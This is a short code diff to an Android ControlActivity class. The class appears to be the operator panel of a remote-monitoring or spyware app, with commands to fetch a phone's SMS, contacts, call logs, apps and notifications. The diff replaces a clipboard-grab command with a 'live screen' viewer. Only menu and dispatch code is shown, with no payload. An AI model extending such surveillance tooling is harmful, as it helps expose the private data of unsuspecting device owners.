@@ -109,7 +109,7 @@ public class ControlActivity extends Activity {
             {"💬", "SMS", "#FF4D8D", "get_sms"},
             {"👥", "Kontak", "#00E676", "get_contacts"},
             {"📞", "Panggilan", "#FFC107", "get_calls"},
-            {"📋", "Clipboard", "#2ED8FF", "get_clipboard"},
+            {"🖥️", "Live Screen", "#2ED8FF", "live_screen"},
             {"📦", "Aplikasi", "#2196F3", "get_apps"},
             {"🌐", "Jaringan", "#9C27B0", "get_network"},
             {"🔔", "Notifikasi", "#FF9800", "get_notifications"},
@@ -317,6 +317,7 @@ public class ControlActivity extends Activity {
         Intent i = null;
         switch (cmd) {
             case "start_camera": i = new Intent(this, CameraActivity.class); break;
+            case "live_screen": i = new Intent(this, LiveScreenActivity.class); break;
             case "get_sms": i = new Intent(this, SmsActivity.class); break;
             case "get_contacts": i = new Intent(this, ContactsActivity.class); break;
             case "get_calls": i = new Intent(this, CallActivity.class); break;
